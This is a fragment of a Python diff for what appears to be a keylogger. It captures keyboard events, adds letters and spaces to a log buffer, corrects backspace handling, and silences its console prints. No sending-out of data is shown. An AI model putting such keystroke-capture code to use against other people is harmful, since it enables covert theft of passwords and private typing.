@@ -11,15 +11,16 @@ with keyboard.Events() as events:
             if curletter.find('P') == 0:
                 if curletter.find("'") == 10:
                     currenlogpress += curletter[11]
-                    print('Letter added')
+                    #print('Letter added')
                 elif curletter[14] == 's':
                     if curletter[15] == 'p':
                         currenlogpress += ' '
-                        print('Space')
+                        #print('Space')
                 elif curletter[14] == 'b':
                     if curletter[15] == 'a':
-                        currenlogpress = currenlogpress.rstrip(currenlogpress[-1])
-                        print('Backspace')
+                        currenlognumero = len(currenlogpress)
+                        currenlogpress = currenlogpress[:currenlognumero-1]
+                        #print('Backspace')
 
 
 
